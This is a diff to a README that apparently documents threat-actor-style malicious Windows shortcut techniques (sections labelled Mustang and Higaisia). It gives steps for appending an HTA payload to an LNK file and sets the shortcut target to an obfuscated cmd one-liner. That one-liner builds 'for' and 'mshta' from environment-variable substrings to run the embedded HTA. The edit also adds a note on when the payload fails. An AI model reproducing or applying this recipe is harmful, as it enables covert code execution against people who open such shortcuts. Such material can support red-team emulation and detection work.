@@ -12,15 +12,16 @@
 1. create a shortcut
 2. create an HTA file containing your code
 	- included is the HTA used in the provided lnk
-3. concatenate the two files together (lnk first)
-	- > cmd> copy file.lnk+file.hta newfile.lnk
-4. In the new lnk's target property, set the following command (replace mustang.lnk with the new LNK's filename):
+3. In the lnk's target property, set the following command:
 
 	```
-	C:\Windows\System32\cmd.exe /c %comspec% /c f%windir:~-3,1%%PUBLIC:~-9,1% %x in (%temp%=%cd%) do f%windir:~-3,1%%PUBLIC:~-9,1% /f "delims==" %i in ('dir "%x\mustang.lnk" /s /b') do start %TEMP:~-2,1%%windir:~-1,1%h%TEMP:~-13,1%%TEMP:~-7,1%.exe "%i"
+	C:\Windows\System32\cmd.exe /c %comspec% /c f%windir:~-3,1%%PUBLIC:~-9,1% %x in (%temp%=%cd%) do f%windir:~-3,1%%PUBLIC:~-9,1% /f "delims==" %i in ('dir "%x\newfile.lnk" /s /b') do start %TEMP:~-2,1%%windir:~-1,1%h%TEMP:~-13,1%%TEMP:~-7,1%.exe "%i"
 	``` 
+4. concatenate the two files together (lnk first)
+	- > cmd> copy file.lnk+file.hta newfile.lnk
 5. (optional) set the LNK's run property to "minimized"
 
+*note: this payload will fail to run properly when the path contains a space*
 
 ### Higaisia
 
